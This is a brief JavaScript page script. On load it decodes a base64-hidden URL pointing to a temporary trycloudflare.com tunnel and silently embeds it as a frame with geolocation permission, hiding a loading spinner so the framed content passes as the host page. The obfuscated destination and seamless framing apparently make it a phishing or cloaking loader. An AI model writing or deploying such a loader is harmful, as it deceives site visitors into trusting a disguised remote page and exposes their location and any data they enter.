window.addEventListener('DOMContentLoaded', (event) => {

    const base64Url = "aHR0cHM6Ly9vdXRsaW5lZC12ZWdldGFibGUtc3Bpcml0LXN0dW5uaW5nLnRyeWNsb3VkZmxhcmUuY29t"; 
    
    try {
        const targetUrl = atob(base64Url.trim());
        const container = document.getElementById("app_container");
        if (!container) return;

        const ifrm = document.createElement("iframe");
    
        ifrm.src = targetUrl;
        ifrm.id = "_view_frame";
        ifrm.className = "_view_frame"; 
        ifrm.allow = "geolocation"; 

        ifrm.onload = () => {
         
            requestAnimationFrame(() => {
                ifrm.classList.add('loaded');
                
                const loader = document.getElementById('loader');
                if (loader) {
                    loader.classList.add('hidden');
                }
            });
        };
        
        container.appendChild(ifrm);

    } catch (err) {
        console.error("Error decoding URL:", err);
    }
});
